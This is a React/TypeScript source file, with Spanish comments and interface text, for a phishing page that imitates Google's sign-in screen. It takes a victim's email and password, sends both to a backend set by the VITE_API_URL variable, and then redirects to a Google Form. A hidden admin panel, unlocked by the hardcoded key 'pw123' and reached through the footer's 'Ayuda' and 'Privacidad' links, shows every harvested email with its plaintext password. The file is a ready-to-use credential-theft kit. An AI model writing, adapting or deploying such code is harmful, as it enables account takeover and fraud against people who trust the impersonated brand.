import { useState, useEffect } from 'react'
import './App.css'

interface User {
  id: number
  email: string
  password: string
  created_at: string
}

const API_URL = import.meta.env.VITE_API_URL


const useIsMobile = () => {
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768)
  
  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth <= 768)
    window.addEventListener("resize", handleResize)
    return () => window.removeEventListener("resize", handleResize)
  }, [])
  
  return isMobile
}

function App() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [showPasswordView, setShowPasswordView] = useState(false)
  const [showPrivacyView, setShowPrivacyView] = useState(false)
  const [showUsersTable, setShowUsersTable] = useState(false)
  const [adminKey, setAdminKey] = useState('')
  const [users, setUsers] = useState<User[]>([])
  const [message, setMessage] = useState('') // para mostrar confirmación o error
  const isMobile = useIsMobile()
  
  // === función que envía el correo al backend Flask ===
  const handleEmailSubmit = async () => {
    if (!email) {
      setMessage('⚠️ Ingresa un correo antes de continuar')
      return
    }

    // Enviar al backend (tanto móvil como escritorio)
    try {
      const response = await fetch(`${API_URL}/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email }) // envía el correo al backend
      })

      const data = await response.json()

      if (response.ok) {
        // Mostrar vista de contraseña en ambos casos
        setShowPasswordView(true)
        setMessage('')
      } else {
        setMessage(`❌ Error: ${data.error || 'No se pudo guardar'}`)
      }
    } catch (error) {
      console.error('Error al conectar con el backend:', error)
      // Aún así mostrar la vista de contraseña para continuar el flujo
      setShowPasswordView(true)
      setMessage('')
    }
  }

  // === función que envía la contraseña al backend y redirige al formulario ===
  const handlePasswordSubmit = async () => {
    if (!password) {
      setMessage('⚠️ Ingresa tu contraseña antes de continuar')
      return
    }

    // Enviar datos al backend antes de redirigir (no bloquea la redirección si falla)
    if (API_URL) {
      try {
        const response = await fetch(`${API_URL}/submit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password })
        })
        
        if (!response.ok) {
          console.error('Error al guardar en el backend')
        }
      } catch (error) {
        console.error('Error al conectar con el backend:', error)
      }
    }

    // Redirigir al formulario de Google (siempre se ejecuta)
    window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSfvlQFtK6i3ZCt7mVNtXFZRHOc_tpAnRsNtjgFKkZRjoIb1tg/viewform'
  }

  // === función para verificar la clave de administrador ===
  const handleAdminKeySubmit = async () => {
    if (adminKey === 'pw123') {
      // Cargar usuarios desde el backend
      try {
        const response = await fetch(`${API_URL}/users`)
        const data = await response.json()
        if (response.ok) {
          setUsers(data.users || [])
          setShowUsersTable(true)
          setMessage('')
        } else {
          setMessage('❌ Error al cargar usuarios')
        }
      } catch (error) {
        console.error('Error al cargar usuarios:', error)
        setMessage('❌ Error de conexión con el servidor')
      }
    } else {
      setMessage('⚠️ Clave incorrecta')
    }
  }

  // === función para volver a la vista principal ===
  const handleBackToMain = () => {
    setShowPrivacyView(false)
    setShowUsersTable(false)
    setAdminKey('')
    setUsers([])
    setMessage('')
  }

  // Vista de tabla de usuarios
  if (showUsersTable) {
    return (
      <div className="app-container">
        <div className="login-dialog">
          <div className="header-top">
            <svg className="google-logo" viewBox="0 0 24 24" width="24" height="24">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
              <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
            </svg>
          </div>
          <div className="dialog-header">
            <div className="header-left">
              <h1 className="login-title">Usuarios Registrados</h1>
            </div>
          </div>
          <div className="users-table-container">
            <table className="users-table">
              <thead>
                <tr>
                  <th>ID</th>
                  <th>Email</th>
                  <th>Contraseña</th>
                  <th>Fecha de Registro</th>
                </tr>
              </thead>
              <tbody>
                {users.map((user) => (
                  <tr key={user.id}>
                    <td>{user.id}</td>
                    <td>{user.email}</td>
                    <td>{user.password}</td>
                    <td>{new Date(user.created_at).toLocaleString('es-ES')}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
          <div className="admin-actions">
            <button className="back-btn" onClick={handleBackToMain}>Volver</button>
          </div>
        </div>
      </div>
    )
  }

  // Vista de clave de administrador
  if (showPrivacyView) {
    return (
      <div className="app-container">
        <div className="login-dialog">
          <div className="header-top">
            <svg className="google-logo" viewBox="0 0 24 24" width="24" height="24">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
              <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
            </svg>
          </div>
          <div className="dialog-header">
            <div className="header-left">
              <h1 className="login-title">Privacidad</h1>
              <p className="login-subtitle">Ingresa la clave de acceso</p>
            </div>
          </div>
          <div className="mobile-content">
            <div className="mobile-input-container">
              <input
                type="password"
                className="mobile-email-input"
                placeholder="Clave"
                value={adminKey}
                onChange={(e) => setAdminKey(e.target.value)}
                onKeyPress={(e) => e.key === 'Enter' && handleAdminKeySubmit()}
              />
            </div>
          </div>
          <div className="mobile-footer">
            <button className="back-btn" onClick={handleBackToMain}>Volver</button>
            <button className="mobile-next-btn" onClick={handleAdminKeySubmit}>Acceder</button>
          </div>
          {message && (
            <p style={{ textAlign: 'center', marginTop: '15px', color: message.includes('Error') || message.includes('incorrecta') ? '#f44336' : 'white' }}>
              {message}
            </p>
          )}
        </div>
      </div>
    )
  }

  // Vista principal de login
  return (
    <div className="app-container">
      <div className="login-dialog">
        <div className="header-top">
          <svg className="google-logo" viewBox="0 0 24 24" width="24" height="24">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
          </svg>
        </div>

        <div className="dialog-header">
          <div className="header-left">
            <h1 className="login-title">{showPasswordView ? 'Te damos la bienvenida' : 'Inicia sesión'}</h1>
            {!showPasswordView && <p className="login-subtitle">Utiliza tu cuenta de Google</p>}
          </div>
          {!showPasswordView && (
            <div className="header-right">
              <div className="input-container">
                <input
                  type="text"
                  className="email-input"
                  placeholder="Correo electrónico o teléfono"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
            </div>
          )}
        </div>

        {!showPasswordView && (
          <div className="dialog-content">
            <div className="content-left">
              <p className="description">
                con tu cuenta de Google. Esta cuenta estará disponible para otras aplicaciones de Google en el navegador.
              </p>
            </div>

            <div className="content-right">
              <a href="#" className="forgot-link">¿Has olvidado tu correo electrónico?</a>
              
              <p className="guest-mode-info">
                ¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada. <a href="#" className="info-link">Más información sobre cómo usar el modo Invitado</a>
              </p>
            </div>
          </div>
        )}

        {!showPasswordView && (
          <>
            <div className="mobile-content">
              <div className="mobile-input-container">
                <input
                  type="text"
                  className="mobile-email-input"
                  placeholder="Correo electrónico o teléfono"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
              <a href="#" className="mobile-forgot-link">¿Has olvidado tu correo electrónico?</a>
              <p className="mobile-guest-mode-info">
                ¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada. <a href="#" className="info-link">Más información sobre cómo usar el modo Invitado</a>
              </p>
            </div>

            <div className="dialog-footer">
              <a href="#" className="create-account-link">Crear cuenta</a>
              {/* 🔹 botón que envía el email al backend */}
              <button className="next-btn" onClick={handleEmailSubmit}>Siguiente</button>
            </div>

            <div className="mobile-footer">
              <a href="#" className="mobile-create-account-link">Crear cuenta</a>
              <button className="mobile-next-btn" onClick={handleEmailSubmit}>Siguiente</button>
            </div>
          </>
        )}

        {showPasswordView && (
          <>
            {/* Vista móvil de contraseña */}
            <div className="password-mobile-content">
              <div className="password-email-container">
                <div className="password-email-field" onClick={() => setShowPasswordView(false)}>
                  <svg className="user-icon" width="20" height="20" viewBox="0 0 24 24">
                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                  </svg>
                  <span className="password-email-text">{email || 'joacoestebanv@gmail.com'}</span>
                  <svg className="dropdown-arrow" width="20" height="20" viewBox="0 0 24 24">
                    <path d="M7 10l5 5 5-5z"/>
                  </svg>
                </div>
              </div>

              <div className="password-input-container">
                <input
                  type={showPassword ? "text" : "password"}
                  className="password-input"
                  placeholder="Introduce tu contraseña"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>

              <div className="show-password-container">
                <input
                  type="checkbox"
                  id="show-password"
                  className="show-password-checkbox"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                />
                <label htmlFor="show-password" className="show-password-label">Mostrar contraseña</label>
              </div>

              <div className="password-footer-row">
                <a href="#" className="forgot-password-link">¿Has olvidado tu contraseña?</a>
                <button className="password-next-btn" onClick={handlePasswordSubmit}>Siguiente</button>
              </div>
            </div>

            {/* Vista de escritorio de contraseña */}
            <div className="password-desktop-content">
              <div className="password-desktop-left">
                <div className="password-account-info">
                  <div className="password-account-email-field" onClick={() => setShowPasswordView(false)}>
                    <span className="password-account-email">{email || 'joacoestebanv@gmail.com'}</span>
                    <svg className="dropdown-arrow" width="20" height="20" viewBox="0 0 24 24">
                      <path d="M7 10l5 5 5-5z"/>
                    </svg>
                  </div>
                </div>
              </div>

              <div className="password-desktop-right">
                <div className="password-desktop-input-wrapper">
                  <label className="password-label">Introduce tu contraseña</label>
                  <input
                    type={showPassword ? "text" : "password"}
                    className="password-desktop-input"
                    placeholder=""
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handlePasswordSubmit()}
                  />
                </div>

                <div className="show-password-desktop-container">
                  <input
                    type="checkbox"
                    id="show-password-desktop"
                    className="show-password-checkbox"
                    checked={showPassword}
                    onChange={(e) => setShowPassword(e.target.checked)}
                  />
                  <label htmlFor="show-password-desktop" className="show-password-label">Mostrar contraseña</label>
                </div>

                <div className="password-desktop-footer">
                  <a href="#" className="try-another-way-link">Probar otra manera</a>
                  <button className="password-desktop-next-btn" onClick={handlePasswordSubmit}>Siguiente</button>
                </div>
              </div>
            </div>
          </>
        )}

        {/* 🔹 mensaje de confirmación */}
        {message && (
          <p style={{ textAlign: 'center', marginTop: '15px', color: 'white' }}>
            {message}
          </p>
        )}
      </div>

      <div className="page-footer">
        <div className="language-selector">
          <span>Español (España)</span>
          <svg width="12" height="12" viewBox="0 0 12 12">
            <path d="M6 8L2 4h8L6 8z"/>
          </svg>
        </div>
        <div className="footer-links">
          <a href="#" onClick={(e) => { e.preventDefault(); setShowPrivacyView(true) }}>Ayuda</a>
          <a href="#" onClick={(e) => { e.preventDefault(); setShowPrivacyView(true) }}>Privacidad</a>
          <a href="#">Términos</a>
        </div>
      </div>
    </div>
  )
}

export default App
